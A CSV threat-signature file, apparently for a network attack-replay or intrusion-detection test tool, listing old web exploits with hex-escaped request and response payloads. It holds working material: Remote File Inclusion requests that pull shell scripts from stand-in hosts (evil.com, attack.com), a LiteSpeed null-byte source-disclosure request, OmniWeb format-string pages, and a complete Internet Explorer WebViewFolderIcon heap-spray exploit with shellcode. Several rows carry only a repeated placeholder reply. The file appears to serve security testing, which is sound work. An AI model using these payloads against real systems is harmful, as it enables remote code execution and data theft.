XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
WebDAV_rs.xml,WebDAV IIS Exploit,This threat is an exploit against the IIS WebDAV flaw.  Attempts to create a remote shell on the target machine.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿eva-web_rfi.xml,EVA-Web 1.1<= 2.2 (index.php3) Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Eva-Web is a web application that typically listens on port 80.,HTTP,TCP,GET /eva/index.php3?aide=http||3A ||//www.evil.com/shell.txt? HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
eva-web_rfi.xml,EVA-Web 1.1<= 2.2 (index.php3) Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Eva-Web is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿ie_webviewfolder_bof.xml,Microsoft Internet Explorer WebViewFolderIcon Buffer Overflow Vulnerability,"This threat uses a malicious server reply that allows for a remote buffer
overflow or DoS attack.
This affects Internet Explorer Web Browser clients that typically connect to the
http port 80.",HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
ie_webviewfolder_bof.xml,Microsoft Internet Explorer WebViewFolderIcon Buffer Overflow Vulnerability,"This threat uses a malicious server reply that allows for a remote buffer
overflow or DoS attack.
This affects Internet Explorer Web Browser clients that typically connect to the
http port 80.",HTTP,TCP,"HTTP/1.1 304 Not Modified||0D 0A ||Date||3A || Thu, 28 Sep 2006 18||3A ||30||3A ||36 GMT||0D 0A ||Server||3A || Apache||0D 0A ||Connection||3A || close||0D 0A ||ETag||3A || ||22 ||234065-141-418d502fbce00||22 0D 0A 0D 0A ||<HTML><BODY><SCRIPT language=||22 ||javascript||22 ||>||0D 0A 09 ||var heapSprayToAddress = 0x05050505||3B 0D 0A 09 ||var payLoadCode = unescape(||0D 0A 09 22 ||%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120||22 || +||0D 0A 09 22 ||%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424||22 || +||0D 0A 09 22 ||%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304||22 || +||0D 0A 09 22 ||%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0||22 || +||0D 0A 09 22 ||%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%uF068%u048A%u685F%uFE98%u0E8A||22 || +||0D 0A 09 22 ||%uFF57%u63E7%u6C61%u0063||22 ||)||3B 0D 0A 09 ||var heapBlockSize = 0x400000||3B 0D 0A 09 ||var payLoadSize = payLoadCode.length * 2||3B 0D 0A 09 ||var spraySlideSize = heapBlockSize - (payLoadSize+0x38)||3B 0D 0A 09 ||var spraySlide = unescape(||22 ||%u0505%u0505||22 ||)||3B 0D 0A 09 ||spraySlide = getSpraySlide(spraySlide,spraySlideSize)||3B 0D 0A 09 ||heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize||3B 0D 0A 09 ||memory = new Array()||3B 0D 0A 0D 0A 09 ||for (i=0||3B ||i<heapBlocks||3B ||i++)||0D 0A 09 ||{||0D 0A 09 09 ||memory[i] = spraySlide + payLoadCode||3B 0D 0A 09 ||}||0D 0A 0D 0A ||   ||09 ||for ( i = 0 ||3B || i < 128 ||3B || i++) ||0D 0A 09 ||{||0D 0A 09 09 ||try{ ||0D 0A 09 09 09 ||var tar = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1')||3B 0D 0A 09 09 09 ||tar.setSlice(0x7ffffffe, 0x05050505, 0x05050505,0x05050505 )||3B || ||0D 0A 09 09 ||}catch(e){}||0D 0A 09 ||}||0D 0A 0D 0A 09 ||function getSpraySlide(spraySlide, spraySlideSize)||0D 0A 09 ||{||0D 0A 09 09 ||while (spraySlide.length*2<spraySlideSize)||0D 0A 09 09 ||{||0D 0A 09 09 09 ||spraySlide += spraySlide||3B 0D 0A 09 09 ||}||0D 0A 09 09 ||spraySlide = spraySlide.substring(0,spraySlideSize/2)||3B 0D 0A 09 09 ||return spraySlide||3B 0D 0A 09 ||}||0D 0A ||</SCRIPT> </BODY></HTML>"
﻿javaWebServer.xml,Java Web Server Remote Command Execution,This threat attempts to compile an HTML page and execute it through the Java Web Server application.  Allows the remote attacker to create and run any program of their choosing.  Java Web Server administration panel typically listens on port 9090 and uses HTTP.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿lightspeedweb_disclosure.xml,LiteSpeed Web Server <= 3.2.3 Remote Source Code Disclosure Vulnerability,This threat leverages a Mime type injection flaw in LiteSpeed Web Server that leads to the disclosure of source code on the affected site. LiteSpeed Web Server can be found listening on port 80.,HTTP,TCP,GET /index.php%00.txt HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
lightspeedweb_disclosure.xml,LiteSpeed Web Server <= 3.2.3 Remote Source Code Disclosure Vulnerability,This threat leverages a Mime type injection flaw in LiteSpeed Web Server that leads to the disclosure of source code on the affected site. LiteSpeed Web Server can be found listening on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿man2web_cmd_1.xml,man2web Remote Command Execution,"This threat attempts to run a command through a scripting flaw in the man2web HTML generation application.  man2web is a CGI script that allows users to browse man pages through the web.  It is part of a web server, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿man2web_cmd_2.xml,man2web Remote Command Execution 2,"This threat runs a series of commands through a flaw in the man2web CGI script.  It allows a remote attacker to gain control of the server with the rights of the webserver.  This can lead to further exploitation.  man2web is a web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿mdweb_rfi.xml,Mdweb132-postgres\: Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MdWeb132-postgres is a web application that typically listens on port 80.,HTTP,TCP,GET /mdweb/admin/inc/organisations/form_org.inc.php?chemin_appli=http||3A ||//attack.com/shell.php? HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || msnbot/1.0||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
mdweb_rfi.xml,Mdweb132-postgres\: Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MdWeb132-postgres is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿omniweb_fmt.xml,OmniWeb Javascript alert() Format String Vulnerability,"This threat simulates a client requesting a web page, and the server replying with a maliciously constructed HTML document. This page will trigger a format string vulnerability in the Javascript alert() function, which can allow execution of arbitrary code.",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Wed, 10 Jan 2007 18||3A ||26||3A ||57 GMT||0D 0A ||Server||3A || Apache||0D 0A ||Last-Modified||3A || Sun, 07 Jan 2007 20||3A ||12||3A ||24 GMT||0D 0A ||ETag||3A || ||22 ||db0027-1a5-42678ee5f5a00||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 421||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || text/html||3B || charset=UTF-8||0D 0A 0D 0A ||<!DOCTYPE html PUBLIC ||22 ||-//W3C//DTD XHTML 1.1//EN||22 0A 09 22 ||http||3A ||//www.w3.org/TR/xhtml11/DTD/xhtml11.dtd||22 ||>||0A ||<html>||0A 09 ||<head>||0A 09 09 ||<title>MOAB-07-01-2007</title>||0A 09 09 ||<script>||0A 09 09 09 ||/* LMH */||0A 09 09 09 ||function boom() {||0A 09 09 09 09 ||var str = 'A'||3B 0A 09 09 09 09 ||while (str.length <= 32) str+=str||3B 0A 09 09 09 09 ||str = str + '%n%n%n%n%n%n'||3B 0A 09 09 09 09 ||alert(str)||3B 0A 09 09 09 ||}||0A 09 09 ||</script>||0A 09 ||</head>||0A 09 ||<body>||0A 09 09 ||<input type=||22 ||button||22 || onclick=||22 ||boom()||3B 22 || value=||22 ||Test MOAB-07-01-2007||22 || />||0A 09 ||</body>||0A ||</html>"
﻿omniweb_format.xml,Omniweb Format String Vulnerability,This threat sends out a malicious webpage that can write arbitrary values to memory in the Omniweb Webbrowser.  This is passing the argument %n%n%n to the alert method in javascript.  This attack would come from a  malicious webserver listening on port 80.,HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
omniweb_format.xml,Omniweb Format String Vulnerability,This threat sends out a malicious webpage that can write arbitrary values to memory in the Omniweb Webbrowser.  This is passing the argument %n%n%n to the alert method in javascript.  This attack would come from a  malicious webserver listening on port 80.,HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Mon, 08 Jan 2007 22||3A ||41||3A ||15 GMT||0D 0A ||Server||3A || Apache||0D 0A ||Last-Modified||3A || Sun, 07 Jan 2007 20||3A ||12||3A ||24 GMT||0D 0A ||ETag||3A || ||22 ||db0027-1a5-42678ee5f5a00||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 421||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || text/html||3B || charset=UTF-8||0D 0A 0D 0A ||<!DOCTYPE html PUBLIC ||22 ||-//W3C//DTD XHTML 1.1//EN||22 0A 09 22 ||http||3A ||//www.w3.org/TR/xhtml11/DTD/xhtml11.dtd||22 ||>||0A ||<html>||0A 09 ||<head>||0A 09 09 ||<title>MOAB-07-01-2007</title>||0A 09 09 ||<script>||0A 09 09 09 ||/* LMH */||0A 09 09 09 ||function boom() {||0A 09 09 09 09 ||var str = 'A'||3B 0A 09 09 09 09 ||while (str.length <= 32) str+=str||3B 0A 09 09 09 09 ||str = str + '%n%n%n%n%n%n'||3B 0A 09 09 09 09 ||alert(str)||3B 0A 09 09 09 ||}||0A 09 09 ||</script>||0A 09 ||</head>||0A 09 ||<body>||0A 09 09 ||<input type=||22 ||button||22 || onclick=||22 ||boom()||3B 22 || value=||22 ||Test MOAB-07-01-2007||22 || />||0A 09 ||</body>||0A ||</html>"
